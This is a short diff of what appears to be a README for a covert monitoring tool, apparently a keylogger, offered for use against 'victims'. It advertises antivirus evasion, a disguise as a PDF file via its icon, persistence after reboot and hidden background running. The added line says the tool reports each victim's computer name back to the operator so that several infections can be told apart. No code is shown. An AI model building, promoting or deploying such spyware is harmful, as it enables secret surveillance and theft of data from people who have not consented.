@@ -7,6 +7,7 @@ Its an .exe file and will by pass most of the antivirus.
 You can put any icon on this exe file. PDF file icon would look cool.
 Even if the file is stopped from Task manager, it will pick up itself on next reboot.
 The file completely runs in background.
+The file first sends you the name of victim's computer. So incase you have deployed it in multiple systems, you can know where the text is coming from.
 
 To change this code into exe file:
 
